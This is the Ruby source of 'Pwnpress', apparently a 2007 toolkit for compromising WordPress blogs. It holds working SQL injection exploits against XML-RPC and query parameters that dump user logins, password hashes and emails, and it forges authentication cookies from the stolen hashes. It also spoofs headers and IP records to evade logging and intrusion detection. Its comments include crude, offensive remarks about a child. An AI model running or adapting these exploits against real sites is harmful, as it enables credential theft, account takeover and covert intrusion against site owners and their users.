#!/usr/bin/env ruby
#                .---. .---.
#               :     : o   :    happy antiblogging, dear kids!
#           _..-:   0 :     :-.._    /
#       .-''  '  `---' `---' "   ``-.         Copyright (c) Lance M. 
Havok
#     .'   "   '  "  .    "  . '  "  `.       <lmh [at] info-pull.com>
#    :   '.---.,,.,...,.,.,.,..---.  ' ;
#    `. " `.                     .' " .'      ----- All rights reserved.
#     `.  '`.   .-/|||||||\-.   .' ' .'       2006, 2007.
#      `.    `-._   \|||/   _.-' "  .'
#        `. "    '"--...--"'  . ' .'    ...because blogs are useless
#  jgs   .'`-._'    " .     " _.-'`.       self-promotion and mental
#      .'      ```--.....--'''    ' `:               masturbation...
#   "The blogosphere end is fucking nigh!"
#                                              -RELEASE LESS, RELEASE 
BEST-
# == Disclaimer and license
# This code is *NOT* GPL. Commercial usage is strictly forbidden (any 
activity
# directly or indirectly generating revenue: consulting, distribution in 
slides,
# mirroring in websites with ad/affiliate programs, advertise your web 
IDS, etc).
#
# == Pwnpress motivation and features
# Pwnpress implements multiple techniques, bugs and tricks for 
compromising
# Wordpress-based blogs, combining the exploits in the necessary order 
for
# retrieving any necessary information to make the exploitation process 
as
# reliable as possible. Because every time you 'blog', god mutilates the 
penis
# of a poor 12 year old Vietnamese boy.
#
# Covertness capability is provided, dynamically adapting the payloads 
and
# operations to lower potential 'noise' on the wire. Fingerprinting 
deploys few
# methods able to detect all versions of Wordpress in their default 
installation
# form without tampering of wp-includes/version.php
#
# Tested with Wordpress 2.2, 2.2.2, 2.0.5, 2.0.6, 2.1, (...), PHP/5.2.4 
for
# Apache 2.0.58 on Gentoo GNU/Linux. magic_quotes on and off for the 
different
# exploits.
#
# == A short advice (for those who desperately need a working brain)
# Due to the recent incidents of people ripping some of our work at 
Blackhat and
# other *pointless* security conferences, we politely ask you to refrain 
from
# doing such a mean thing. If you can't be creative, find a different 
hobby.
# "DANGER RABBI ROBINSON: INFOWAR!" Gadi Evron, blogs.securiteam.com (WP 
2.0.10)
# Trespassers expect career disruption and public humiliation... :)
#

require 'digest/md5'
require 'net/http'
require 'base64'
require 'irb'
require 'uri'

class Array
    # Return random item
    def rand_i
        return self[rand(self.size)]
    end
end

class String
    # http://snippets.dzone.com/posts/show/2111
    def self.rnd(size = 16)
        (1..size).collect { (i = Kernel.rand(62);
        i += ((i < 10) ? 48 : ((i < 36) ? 55 : 61 ))).chr }.join
    end
end

# Oh jesuschrist, here comes the pie!
class Pwnpress
    PWNPRESS_VERSION         = "0.1pub"
    LATEST_VERSION_SUPPORTED = "2.2.2"
    DEFAULT_TABLE_PREFIX     = "wp"
    KNOWN_REGEXPS            = {
        :meta_generator => /<meta name="generator" content="(.+?)" \/>/,
        :rss_feed_links =>
            [
                /title="RSS 2.0" href="(.*)"/,
                /title="RSS .92" href="(.*)"/
                
            ],
        :atom_feed_links =>
            [
                /title="Atom 0.3" href="(.*)"/
            ],
        :rss2_generator =>
            [
                
/<generator>http:\/\/wordpress.org\/?v=(.+?)<\/generator>/,
                /generator="(.+?)"/
            ],
        :atom_generator =>
            [
                /uri="http:\/\/wordpress.org\/" 
version="(.+?)">Word(P|p)ress/
                # This fixes dumb editors with stupid syntax 
highlighting :)"
            ]
    }
    
    attr_reader :results
    
    # Initialize the instance variables, etc. Perform any required 
operations
    # to set the initial state ready.
    def initialize(options)
        unless options[:target] != nil
            raise "Missing target URL parameter."
        end
        
        # Check for missing trailing slash, add if necessary
        if options[:target].split(//).last != '/'
            options[:target] << '/'
        end
        
        
        @url          = URI.parse(options[:target])
        @proxy_host   = options[:proxy_host]
        @proxy_port   = options[:proxy_port]
        @table_prefix = options[:table_prefix]
        @username     = options[:username]
        @password     = options[:password]
        @covert_level = options[:covert_level]
        @results      = {}
        @finger_on    = options[:fingerprint]
        
        if options[:version] == "auto"
            @version = fingerprint_wordpress()
            if @version
                msg_name = "Found Wordpress version."
                msg_desc = %Q{
                    Target has #{@version} installed. Current last
                    release (devel) is #{@wp_versions.last}. Known
                    versions: #{@wp_versions.size} (includes devel).
                }
                
                add_results_msg(:wp_version, :success, msg_name, 
msg_desc)
            else
                msg_name = "Can't find Wordpress version."
                msg_desc = %Q{
                    Target has an unknown Wordpress version installed.
                    It might be fake or bogus. Please specify target
                    version yourself, since fingerprinting failed :(
                }
                
                add_results_msg(:wp_version, :failure, msg_name, 
msg_desc)
            end
        else
            fingerprint_wordpress(true)
            @version = options[:version]
        end
        
    end
    
    # Attempt to verify wordpress presence and installed version + patch 
level:
    #
    # 1. Default installation contains a META generator header.
    # 2. Default RSS/ATOM feed generation code also provides version 
information.
    # 3. Default template and most styles include "Powered by" text.
    #
    #     <meta name="generator" content="WordPress 2.2.2" />
    #     <!-- generator="wordpress/2.2.2" -->
    #     <generator>http://wordpress.org/?v=2.2.2</generator>
    #     proudly powered by <a 
href="http://wordpress.org/">WordPress</a>
    #     <generator url="http://...org/" 
version="1.5.2">WordPress</generator>
    #
    # The above methods can be fooled by simply editing 
wp-includes/version.php
    # Covert level affects what methods might be used, depending on how 
clumsy
    # the activity could be on the wire. Fingerprinting is highly 
effective in
    # most cases but there are still users who decide to fake version 
strings,
    # therefore a method using some heuristics is provided as well. 
Obviously it
    # can be fooled as easily, but helps to identify branch and feature 
sets.
    #
    # Methods involving extremely simple "heuristics":
    #
    # 4. Detect the style and layout of the login interface.
    # 5. Detect files that are present only in certain revisions or 
branches.
    # 6. Detect plugins and themes or styles available only for some 
branches.
    #
    # This list isn't exhaustive, there are other potentially reliable
    # methods (depending on desired attack surface: default 
installation, custom
    # blogs, heavily modified code, etc). Ski ba bop ba dop bop!
    #
    def fingerprint_wordpress(only_retrieve_body = false)
        index_paths = [ "index.php", "?#comments" ]
        rss2_paths  = [ "?feed=rss2", "?feed=comments-rss2" ]
        atom_paths  = [ "?feed=atom", "?feed=comments-atom" ]
        
        unless @body
            @body = retrieve_content(index_paths.rand_i)
            if @body == nil
                raise "HTTP GET failed: wrong path or offline?"
            end
        end
        
        if @body and only_retrieve_body == false and @finger_on
            get_valid_versions_array

            # Retrieve existing RSS and ATOM feed paths. Note that this 
will
            # only try to match for the target url. If Wordpress has set 
a
            # different base url, then these checks won't use it.
            KNOWN_REGEXPS[:rss_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                rss2_paths << uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            KNOWN_REGEXPS[:atom_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                atom_paths << uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            # Method 1
            meta_generator = 
@body.scan(KNOWN_REGEXPS[:meta_generator]).flatten
            if meta_generator
                wp_string = meta_generator[0].scan(/(.+?) (.*)/).flatten
                if wp_string.size ==  2
                    if wp_string[0] =~ /Word(p|P)ress/i
                        if wp_string[1]
                            # Verify version against those known to be 
valid
                            if @wp_versions.find { |v| v[0] == 
wp_string[1] }
                                return wp_string[1]
                            end
                        end
                    end
                end
            end
            
            # Note: could refactor these two as a method and save some 
lines,
            # but this is the only existing place where it would be 
used.
            # Method 2: RSS
            rss2 = get_meta_value(rss2_paths.rand_i, :rss2_generator)
            if rss2 and rss2[:str]
                ver = rss2[:str].scan(/(.*)\/(.*)/).flatten
                if ver and ver.size == 2
                    if @wp_versions.find { |v| v[0] == ver[1] }
                        return ver[1]
                    end
                end
            end
            
            # Method 2: ATOM
            atom = get_meta_value(atom_paths.rand_i, :atom_generator)
            if atom and atom[:str]
                if @wp_versions.find { |v| v[0] == atom[:str] }
                    return atom[:str]
                end
            end
            
            # Method 4: determine login box layout and/or style. works 
for
            # checking if the version is post 2.2 branch or older (pre 
2.2).
            # Besides that, this isn't of much help.
            if @covert_level < 1
                login_body = retrieve_content("wp-login.php")
                if login_body =~ /<html 
xmlns="http:\/\/www.w3.org\/1999\/xhtml" dir="ltr">/
                    return "post-2.2"
                end
                if login_body =~ /<html 
xmlns="http:\/\/www.w3.org\/1999\/xhtml">/
                    return "pre-2.2"
                end
            end
            
            # Method 5: branch-persistent files
            if @covert_level < 1
                # wp-app.php and wp-cron.php are from old 1.5 branch
                if retrieve_content("wp-app.php", @url, nil, true).code 
== "404"
                    return "likely-2.2"
                else
                    return "likely-1.5"
                end
            end
            
            # Method 3: final, we return nil since we really cant tell 
an exact
            # version.
            if @body =~ /(proudly powered by|Powered by) <a 
href=(.*)wordpress(.*)>/
                return nil
            end
        end
    end
    
    # A brilliant bug fixed after 2.2(.0) which was exploitable by least
    # privileged users (ex. Subscribers) via the XML-RPC interface:
    #
    #   function wp_suggestCategories($args) {
    #   ...
    #       $this->escape($args);
    #       $blog_id                = (int) $args[0];
    #       ...
    #       $max_results            = $args[4];           !! where's mr. 
(int)?
    #       ...
    #       if(!empty($max_results)) {
    #           $limit = "LIMIT {$max_results}";          !! :>
    #
    #     $category_suggestions = $wpdb->get_results("    !! "I see dead 
SQL :("
    #       SELECT cat_ID category_id,
    #           cat_name category_name
    #       FROM {$wpdb->categories}
    #       WHERE cat_name LIKE '{$category}%'
    #       {$limit}                                      !! 
kekekekekekeKEKEKE!
    #       ");
    #
    #   return($category_suggestions);
    #
    # Fixed in later revisions (ex. 2.2.2). The bug was reported to the 
Wordpress
    # development team by Alex C, with a .NET C# proof of concept.
    #
    def exploit_220_suggestCategories_xmlrpc
        if @username and  @password
            user_list    = {}
            xmlrpc_path  = get_xmlrpc_path()
            xml_payload  =  "<methodCall>\n"                                   
+
                            
"\t<methodName>wp.suggestCategories</methodName>\n"+
                            "\t<params>\n"                                     
+
                            "\t\t<param><value>1</value></param>\n"            
+
                            
"\t\t<param><value>#{@username}</value></param>\n" +
                            
"\t\t<param><value>#{@password}</value></param>\n" +
                            "\t\t<param><value>1</value></param>\n"            
+
                            "\t\t<param><value>"                               
+
                            "0 UNION ALL SELECT user_login, user_pass 
FROM "   +
                            "WPR3F1X_users"                                    
+
                            "</value></param>\n"                               
+
                            "\t</params>\n"                                    
+
                            "</methodCall>\n"
           
           # Send the query
           if xmlrpc_path
               get_table_prefix()
               
               res = send_xmlrpc(xml_payload.gsub(/WPR3F1X/, 
@table_prefix),
                                 xmlrpc_path)
               if res =~ /Word(P|p)ress database error/ and 
@covert_level < 1
                   # Try to guess prefix again if we had an error
                   get_table_prefix(:db_error, res)
                   res = send_xmlrpc(xml_payload.gsub(/WPR3F1X/, 
@table_prefix),
                                     xmlrpc_path)
               end
               
               # No need for a full-blown XML parser. Ruby is *that* 
nice :>
               if res =~ 
/<member><name>category_id<\/name><value><string>/
                   regex = 
/<member><name>(.+?)<\/name><value><string>(.+?)<\/string><\/value><\/member>/
                   credentials = res.scan(regex)
                   last_user = nil
                   
                   credentials.each do |a|
                      if a[0] == "category_id" and a[1]
                          user_list[a[1]] = { :passwd_hash => nil }
                          last_user = a[1]
                      end
                      if a[0] == "category_name" and a[1]
                          user_list[last_user][:passwd_hash] = a[1]
                          cookie = get_cookie_hash(last_user, a[1])
                          if cookie and cookie.size == 2
                              user_list[last_user][:cookie_user] = 
cookie[0]
                              user_list[last_user][:cookie_pass] = 
cookie[1]
                          end
                      end
                   end
                   
                   add_to_results(:sql_injection_xmlrpc_220, 
:user_hashes,
                                  user_list)
                   return true
               end
               
               # Did not work :(
               return false
           end
        else
            raise "Username and password required for XML-RPC injection 
in 2.2"
        end
    end
    
    # Nice pre-authentication bug found by different individuals, one of 
them my
    # appreciated fellow Jesus H. Christ who coded a rather dirty proof 
of concept
    # doing the job just fine, with magic_quotes = Off. This is a 
cleaner version
    # with few extra checks. Like the original Perl version, uses base64 
to avoid
    # char filtering woes and as a side-effect (bonus!) for mod_security 
evasion
    # :> (thanks to XML-RPC handling, which supports base64 encoded 
elements).
    #
    def exploit_222_pingback_xmlrpc
        user_list = {}
        tags_list = []
        xmlrpc_path  = get_xmlrpc_path()
        
        get_table_prefix()
        
        # First we need to scan for some tags (categories), this is most 
likely
        # 100% reliable if rewrite rules are enabled and theme is 
Wordpress
        # compliant (or follows the usual scheme).
        tags_list = get_existing_tags()
        unless tags_list.size > 0
            msgs = { :failure => { :response => "Can't find suitable 
tag." } }
            msgs[:failure][:description] = %Q{
                \t A suitable permalink-style path is required for the 
exploit
                \t to be successful. Failure to find this parameter 
indicates
                \t that most probably the target is not using URL 
rewrite rules.
                \t The bug does not trigger with "emulated" index.php/ 
style
                \t paths.
            }
            
            add_to_results(:sql_injection_xmlrpc_222, :messages, msgs)
            return false
        end
        
        sql_query =  tags_list.rand_i[:link]
        sql_query << "#{String.rnd}&post_type=#{String.rnd}\%27)"
        sql_query << " UNION SELECT CONCAT(user_pass, \%27 - \%27, 
user_login,"
        sql_query << " \%27 - \%27, user_email), 
2,3,4,5,6,7,8,9,10,11,12,13,"
        sql_query << "14,15,16,17,18,19,20,21,22,23,24 FROM "
        sql_query << "WPR3F1X_users\%2F*"
        
        xml_payload  =  "<methodCall>\n\t<methodName>"                        
+
                        "pingback.extensions.getPingbacks"                    
+
                        "</methodName>\n"                                     
+
                        "\t<base64>INJ_SQL_QUERY</base64>\n"                  
+
                        "</methodCall>\n"
       
        # Send the query
        if xmlrpc_path
            tmp = sql_query.gsub(/WPR3F1X/, @table_prefix)
            tmp = xml_payload.gsub(/INJ_SQL_QUERY/, 
Base64.encode64(tmp))
            res = send_xmlrpc(tmp, xmlrpc_path)
            
            if res =~ /Word(P|p)ress database error/ and @covert_level < 
1
                # Try to guess prefix again if we had an error
                get_table_prefix(:db_error, res)
                tmp = sql_query.gsub(/WPR3F1X/, @table_prefix)
                tmp = xml_payload.gsub(/INJ_SQL_QUERY/, 
Base64.encode64(tmp))
                res = send_xmlrpc(tmp, xmlrpc_path)
            end
            
            wpuser_blob = res.scan(/WHERE post_id IN 
\((.*?)\)/s).flatten[0]
            credentials = wpuser_blob.scan(/([a-z0-9]{32}) \- (.*?) \- 
([^,]+)/i)
            credentials.each do |a|
                password_hash = a[0]
                poor_username = a[1]
                email_address = a[2]
                
                user_list[poor_username] = {
                    :email_addr  => email_address,
                    :passwd_hash => password_hash
                }
                
                cookie = get_cookie_hash(poor_username, password_hash)
                if cookie and cookie.size == 2
                    user_list[poor_username][:cookie_user] = cookie[0]
                    user_list[poor_username][:cookie_pass] = cookie[1]
                end
            end
            
            add_to_results(:sql_injection_xmlrpc_222, :user_hashes, 
user_list)
            return true
        end
        
        return false
    end

    # One of the most sloppy, unreliable and awkward exploits ever 
released for
    # Wordpress. The original exploit from Stefan Esser was mediocre at 
best.
    # No offense meant, it was just a seriously deficient piece of horse 
shit.
    def exploit_205_trackback_utf7
        wpuser_list = {}
        sql_query = ""
        # Left to be implemented someday...
    end
    
    # Present in 1.5.1.1, this one allows dead easy SQL injection (ex. 
via cat
    # variable, for category, in the index page right away). The SQL 
query here
    # is loosely based on the original exploit by Alberto Trivero, with 
extra
    # output. Also, we support multiple user dumping by limiting the 
query per
    # id, and iterating randomly if covert level allows it (since we are 
doing
    # a GET request, as clumsy as cmd.exe at packages.gentoo.org :>).
    def exploit_1511_catsqlinjection
        user_list = {}
        
        sql_query = "#{rand(40)} UNION SELECT 
NULL,CONCAT(CHAR(58),user_pass,"
        sql_query << 
"CHAR(58),user_email,CHAR(58),user_login,CHAR(58)),2,"
        sql_query << "NULL,NULL FROM WPR3F1X_users WHERE id = TUSER/*"

        
        get_table_prefix()
        
        if @covert_level > 1
            iterations = 1
        else
            iterations = rand(20)+1
        end
        
        user_id = 1
        iterations.times do
            tmp = sql_query.gsub(/TUSER/, user_id.to_s)
            tmp = URI.encode(tmp.gsub(/WPR3F1X/, @table_prefix))
            
            res = retrieve_content("?cat=#{tmp}")
            if res =~ /Word(P|p)ress database error/ and @covert_level < 
1
                    get_table_prefix(:db_error, res)
                    tmp = sql_query.gsub(/TUSER/, user_id.to_s)
                    tmp = URI.encode(tmp.gsub(/WPR3F1X/, @table_prefix))
                    res = retrieve_content("?cat=#{tmp}")
            end
            
            if res
                val = res.scan(/:([a-z0-9]{32}):(.*?):(.*?): 
category/).flatten
                if val.size == 3
                    user_list[val[2]] = {
                        :email_addr  => val[1],
                        :passwd_hash => val[0]
                    }
                    
                    cookie = get_cookie_hash(val[2], val[0])
                    if cookie and cookie.size == 2
                        user_list[val[2]][:cookie_user] = cookie[0]
                        user_list[val[2]][:cookie_pass] = cookie[1]
                    end
                end
            end
            
            user_id += 1
        end
        
        if user_list.size > 0
            add_to_results(:sql_injection_cat_1513, :user_hashes, 
user_list)
            return true
        else
            return false
        end
    end
    
    # A code execution flaw in 1.5.1.3 when register_globals is enabled. 
Allows
    # simple exploitation via variables overwrite. The technique is 
based on
    # the original exploit by Kartoffelguru, using a base64 encoded 
command.
    def exploit_1513_codeexec
        cookie_template = 
"wp_filter[query_vars][0][0][function]=get_lastpostdate;"
        cookie_template << 
"wp_filter[query_vars][0][0][accepted_args]=0;"
        cookie_template << 
"wp_filter[query_vars][0][1][function]=base64_decode;"
        cookie_template << 
"wp_filter[query_vars][0][1][accepted_args]=1;"
        cookie_template << "cache_lastpostmodified[server]=//e;"
        cookie_template << "cache_lastpostdate[server]=BASE64CMD;"
        cookie_template << 
"wp_filter[query_vars][1][0][function]=parse_str;"
        cookie_template << 
"wp_filter[query_vars][1][0][accepted_args]=1;"
        cookie_template << 
"wp_filter[query_vars][2][0][function]=get_lastpostmodified;"
        cookie_template << 
"wp_filter[query_vars][2][0][accepted_args]=0;"
        cookie_template << 
"wp_filter[query_vars][3][0][function]=preg_replace;"
        cookie_template << 
"wp_filter[query_vars][3][0][accepted_args]=3;"
        
        # $code = base64_encode($cmd);
        # $cnv = "";
        # for ($i=0;$i<strlen($code); $i++) {
        # $cnv.= "chr(".ord($code[$i]).").";
        # }
        # $cnv.="chr(32)";
        # $str = 
base64_encode('args[0]=eval(base64_decode('.$cnv.')).die()&args[1]=x');

        #cmd = Base64.encode64(cmd).scan(/.{1,600}/o).to_s
        #tmp = cookie_template.gsub(/BASE64CMD/, cmd)
        # TODO FIXME
    end
    
    # Determine what exploits could work against the target version. 
Chain them
    # inside an array and then sequentially execute the methods. These 
are
    # ordered depending on the reliability, and used according to the 
desired
    # covert level.
    def exploit
        @ammunition = []
        
        case @version
            when "1.5.1.1"
                # pre-auth
                @ammunition << exploit_1511_catsqlinjection
            when "1.5.1.3"
                # pre-auth, classic code exec right away.
                @ammunition << exploit_1513_codeexec
            when "2.0.5"
                # pre-auth. esser's exploit was really weak for this one 
:)
                @ammunition << exploit_205_trackback_utf7
            when "2.1.3"
            when "2.2"
                # combo :> (pre-auth + post-auth, pick twice)
                @ammunition << exploit_220_suggestCategories_xmlrpc
                @ammunition << exploit_222_pingback_xmlrpc
            when "2.2.2"
                # pre-auth
                @ammunition << exploit_222_pingback_xmlrpc
            else
                return false
        end
        
        # What would Jesus do?
        @ammunition.each do |headshot|
            headshot
        end
    end
    
    # Retrieve the site hash using a HEAD request, taking username and 
password
    # hash for filling a valid cookie which can be used to operate the 
target
    # account without requiring the password. This can be set in Firefox 
by
    # editing the cookies.txt file or using the proper extension 
providing cookie
    # editing functionality. Uses random headers.
    def get_cookie_hash(username, phash)
        login_path = @url.path + "wp-login.php?action=logout"
        phash      = Digest::MD5.new().hexdigest(phash)
        cookie     = 
"wordpressuser_CHH=#{username};wordpresspass_CHH=#{phash}"
        
        unless @site_cookie_hash
            res = Net::HTTP::Proxy(@proxy_host, 
@proxy_port).start(@url.host,
                                   @url.port) { |http|
                res = http.head(login_path, self.random_headers)
                if res and res["set-cookie"]
                    c = 
res["set-cookie"].scan(/wordpressuser_(.+?)=/).flatten[0]
                    if c.length == 32
                        @site_cookie_hash = c
                    else
                        return nil
                    end
                end
            }
        end
        
        cookie.gsub!(/CHH/, @site_cookie_hash)
        return cookie = cookie.split(/;/)
    end
    
    # Retrieve categories (tags) from the Wordpress content. This is 
used by
    # those SQL injection exploits that rely on valid permalinks or 
other types
    # of "standard" blog elements referring to internal content.
    def get_existing_tags()
        tag_list = []
        
        arr = @body.scan(/<a href="(.+?)" title="View all posts in 
(.+?)" rel="category tag">/)
        if arr and arr.size > 0
            i = 0
            arr.each do |link, tag|
                if tag and link
                    # link could be null, not an issue
                    tag_list[i] = { :tag => tag, :link => link }
                    i += 1
                end
            end
        end
        
        return tag_list
    end
    
    
    # Attempt to guess the table prefix. If no known methods / 
information
    # disclosure bugs worked, use the default setting (wp or wp_svn for 
devel
    # builds).
    #
    # For now, methods available:
    # a) :db_error = scan input string for SQl error leaking wordpress 
prefix
    # b) :db_error + 2.2.{1,0} edit-comments.php apage parameter bug
    #    requires enough privileges, leads to a SQL error with negative 
value
    #    at apage parameter, leaking the wordpress tables pefix:
    #       WordPress database error: ... SELECT SQL_CALC_FOUND_ROWS * 
FROM
    #       wp_comments WHERE comment_approved = '0' OR comment_approved 
= '1'
    #       ORDER BY comment_date DESC LIMIT -40, 25
    #
    def get_table_prefix(method = nil, str = nil)
        if method and str
            case method
                when :db_error
                     regex = /FROM 
(.+?)_(categories|users|posts|links|comments)/
                     new_prefix = str.scan(regex).flatten
                     if new_prefix.size == 1
                         @table_prefix = new_prefix[0]
                     end
                when :edit_coms_221
                     # Not implemented since it requires edit 
privileges.
                     # db_error method suffices almost always.
                else
                    @table_prefix = DEFAULT_TABLE_PREFIX
            end
        else
            # Nothing worked, let's just guess it's default
            @table_prefix = DEFAULT_TABLE_PREFIX
        end
    end
    
    # Attempt to guess the correct xmlrpc.php path relative to base 
directory.
    # Most rewrite rules never bother changing this, therefore it 
shouldn't be
    # necessary to mess with this method. Add new checks if necessary.
    def get_xmlrpc_path()
        unless @xmlrpc_location 
            meta_regexp = /<link rel="pingback" href="(.*)\/(.*)" \/>/
            pingback = @body.scan(meta_regexp).flatten
            if pingback.size == 2
                meta_url = URI.parse(pingback[0])
                
                # Verify URL belongs to target host. Disable this if 
necessary. 
                if meta_url.host == @url.host
                    @xmlrpc_location = pingback[1]
                end
            else
                if remote_file_exists(@url.path + "xmlrpc.php")
                    @xmlrpc_location = "xmlrpc.php"
                else
                    # Nothing worked so far, out of luck.
                    return nil
                end 
            end
        end
        
        return @xmlrpc_location
    end
    
    #
    # Helpers and other utilities.
    #
    
    # Get the meta value of content found at path, using specified 
regexp
    # from the KNOWN_REGEXPS constant (by default)
    def get_meta_value(path, regexp, kregexp = KNOWN_REGEXPS)
        result = nil
        
        txt = retrieve_content(path)
        if txt
            kregexp[regexp].each do |rp|
              mvalue = txt.scan(rp).flatten[0]
              if mvalue
                result = { :str => mvalue, :buf => txt }
              end
            end
        end
        
        return result
    end
    
    # Add data to the results variable, available for read access to 
check
    # for information retrieved from successful exploitation.
    def add_to_results(bug, data_type, array)
        @results[bug] = { :data_type => data_type, :data => array}
    end
    
    # Add a message of given importance and desired information to the 
results
    # hash.
    def add_results_msg(owner, level, name, value)
        new_message = { level => { :response => name } }
        new_message[level][:description] = value
        add_to_results(owner, :messages, new_message)
    end
    
    # :nodoc: "Better than Nikto GET storm!" - a CISSP realizing HEAD 
exists.
    # Uses a HEAD request to check existence of a remote file. Uses 
random
    # headers.
    def remote_file_exists(path)
        does_exist = nil
        
        res = Net::HTTP::Proxy(@proxy_host, 
@proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.head(path, self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   does_exist = true
               else
                   does_exist = false
           end
        }
        
        return does_exist
    end
    
    # Return a random User-Agent string from an array of the most 
popular ones :-)
    # (updated, August 2007). Do not add unusual/uncommon agents that 
stand out.
    def self.random_agent
        available_useragents = [
            "Googlebot/2.1 ( http://www.google.com/bot.html)",
            "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
            "Mozilla/5.0 (X11; U; Linux x86; en-US; rv:1.8.1.6) 
Gecko/20061201 Firefox/2.0.0.6 (Ubuntu-feisty)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.6) 
Gecko/20070725 Firefox/2.0.0.6",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; 
http://help.yahoo.com/help/us/ysearch/slurp)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en) 
AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) 
AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) 
AppleWebKit/523.2+ (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.7.5) 
Gecko/20070321 Netscape/8.1.3",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) 
Gecko/20070321 Netscape/9.0",
            "Opera/9.23 (Windows NT 5.0; U; en)"
        ]
        
        return available_useragents.rand_i
    end
    
    # Random IP address generator, this is used for generation of 
PC_REMOTE_ADDR
    # headers, since we want to leave a fake REMOTE_ADDR in the database 
record:
    # From Wordpress 2.2.2, wp-includes/vars.php (line 39):
    # 
    #  if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )
    #     $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];
    #
    # Optional argument determines the first block to use (ex. 17 = 
Apple :>)
    def self.random_ip(first_block = rand(254))
        return "#{first_block}.#{rand(254)}.#{rand(254)}.#{rand(254)}"
    end
    
    # Simply scans the body content for <a> elements and returns an 
array of
    # links. Useful for Referer spoofing, disguising as a normal 
visitor.
    def get_site_pages
        if @body
            return @body.scan(/<a href="(.*)"/).flatten
        else
            return nil
        end
    end
    
    # Return a hash of HTTP headers generated randomly. The goal is 
generating
    # non-homogeneous requests that contain static patterns.
    def random_headers
        rndheader = {}
        languages = [ "", "", "", "" ]
        rel_pages = get_site_pages()

        rndheader["User-Agent"] = Pwnpress.random_agent
        if rel_pages
            rndheader["Referer"]    = rel_pages.rand_i
        end
        # Spoof REMOTE_ADDR, while this might be "covert" backend-wise, 
normal
        # headers would *never* contain this. this shouldn't work on OS 
X server
        # since the variable would be set server-side already. oh wait, 
I just
        # helped IDS vendors! :>
        if @covert_level > 1
            rndheader["PC_REMOTE_ADDR"] = Pwnpress.random_ip
        end
        
        return rndheader
    end
    
    # Retrieve a list of all existing Wordpress versions from 
wordpress.org.
    # Returns array with the results.
    def get_valid_versions_array
        unless @wp_versions
            regexp = /<td align='center'><a href='(.+?)'>zip<\/a><\/td>/
            wp_url = 
URI.parse("http://wordpress.org/download/release-archive/")
            @wp_versions = [] # not nil, since we need 
self.index(version_to_check)
    
            archive = retrieve_content('', wp_url)
            if archive
                tmp = 
archive.scan(/http:\/\/wordpress.org\/wordpress-(.+?).zip/)
                if tmp
                    @wp_versions = tmp.uniq
                end
            end
        end
    end
    
    # Send a XML-RPC request with data xml and path of xmlrpc.php at 
xmlrpc_path.
    # Returns the response body received from the server or nil if 
failed.
    # Uses random headers or given parameter (avoids recursion in some 
places).
    def send_xmlrpc(xml, xmlrpc_path)
        xml_response = ""
        
        res = Net::HTTP::Proxy(@proxy_host, 
@proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.post(@url.path + xmlrpc_path, xml, 
self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   xml_response = res.body
               else
                   xml_response = nil
           end
        }
        
        return xml_response
    end
    
    # Sends a HTTP GET request to retrieve content available at 
specified
    # relative path path to my_url (ex. my_url being the base Wordpress 
directory
    # and path a file available within that directory).
    # Uses random headers.
    def retrieve_content(path, my_url = @url, headers = nil, return_res 
= false)
        body = ""
        
        res = Net::HTTP::Proxy(@proxy_host, 
@proxy_port).start(my_url.host,
                               my_url.port) { |http|
           if headers
               extra_headers = headers
           else
               extra_headers = self.random_headers
           end
           
           res = http.get(my_url.path + path, extra_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   body = res.body
               else
                   if return_res
                       body = res
                   else
                       body = nil
                   end
           end
        }
        
        return body
    end
end


if __FILE__ =~ /pwnpress.rb/
    require 'optparse'

    OPTIONS = {}
    
    def vputs(msg)
        if OPTIONS[:verbose]
            puts "+> #{msg}"
        end
    end

    if ARGV.size == 0
        puts "Psychic capabilities not yet implemented, sorry. Need 
arguments."
        exit
    end

    puts "> Pwnpress: Wordpress exploitation toolkit 
#{Pwnpress::PWNPRESS_VERSION}"
    puts "> 'High quality antiblog guerrilla tools for the masses.'"
    puts "> (c) 2006, 2007 Lance M. Havok <lmh [at] info-pull.com>"
    
    # Let the Internet Hate Machine deliver:
    begin
        OptionParser.new do |opts|
            opts.banner = "Usage: #{$0} [options]"
            
            OPTIONS[:verbose]      = false
            OPTIONS[:fingerprint]  = true
            OPTIONS[:version]      = "auto" # by default, try to guess 
version
            OPTIONS[:proxy_host]   = nil    # if nil, default to direct 
conn
            OPTIONS[:proxy_port]   = nil    # if nil, default to direct 
conn
            OPTIONS[:table_prefix] = nil    # if nil, Pwnpress retrieves 
it
            OPTIONS[:username]     = nil
            OPTIONS[:password]     = nil
            OPTIONS[:covert_level] = 0      # by default, try 
everything.
            OPTIONS[:irb_shell]    = nil
            
            opts.on("--[no-]verbose", "Run verbosely") do |v|
                OPTIONS[:verbose] = v
            end
            
            opts.on("-t", "--target TARGET_URL", "Target URL (inc. WP 
path)") do |t|
                unless t =~ /(http|https):\/\/(.*)\//i
                    raise "Target must be in form: 
http(s)://domain.tld/wp/"
                end
                OPTIONS[:target] = t
            end
            
            opts.separator ""
            opts.separator "Optional and extra settings:"
            
            opts.on("-u", "--username USER", "Valid username") do |u|
